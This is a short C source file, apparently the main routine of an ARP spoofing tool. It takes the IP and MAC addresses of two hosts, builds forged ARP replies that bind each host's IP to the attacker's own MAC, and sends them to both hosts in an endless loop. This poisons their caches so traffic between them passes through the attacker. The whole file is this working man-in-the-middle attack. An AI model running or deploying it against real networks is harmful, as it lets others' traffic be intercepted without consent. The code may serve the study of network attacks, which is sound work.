#include <inquisitor.h>

int	main(int argc, char *argv[], char *env[]) {
	set_log_level(LEVEL_DEBUG);
	parse_env(env);

	t_args	args;
	if (parse_args(argc, argv, &args)) {
		ERR("Usage: %s <ip-src> <mac-src> <ip-dst> <mac-dst>\n", argv[0]);
		return (1);
	}

	struct ether_addr own_mac;
	get_mac(IFACE_NAME, &own_mac);

	// INFO("Waiting for ARP Request...\n");
	// if (capture(&args)) {
	// 	return (1);
	// }

	char		errbuf[LIBNET_ERRBUF_SIZE];
	libnet_t	*l_client = libnet_init(LIBNET_LINK, IFACE_NAME, errbuf);
	if (!l_client) {
		ERR("libnet_init: %s\n", errbuf);
		return (1);
	}

	libnet_t	*l_server = libnet_init(LIBNET_LINK, IFACE_NAME, errbuf);
	if (!l_server) {
		ERR("libnet_init: %s\n", errbuf);
		return (1);
	}

	build_arp_reply(&own_mac, &(args.src_addr), &(args.dst_mac), &(args.dst_addr), l_client);
	build_arp_reply(&own_mac, &(args.dst_addr), &(args.src_mac), &(args.src_addr), l_server);
	while (1) {
		send_arp_reply(l_client);
		send_arp_reply(l_server);
		usleep(100);
	}
	destroy_arp_reply(l_client);
	destroy_arp_reply(l_server);
	return (0);
}